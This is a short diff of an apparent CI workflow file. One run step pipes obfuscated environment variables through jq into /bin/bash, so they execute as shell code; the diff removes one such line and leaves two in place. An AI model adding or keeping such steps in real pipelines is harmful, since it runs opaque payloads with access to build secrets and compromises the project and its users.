@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$ie34" | jq -r .vfo1002 | /bin/bash
           echo $xnik29811 | jq -r .txc9054 | /bin/bash
-          printf '%s' "$cgyz4364" | jq -r .ogiya57 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
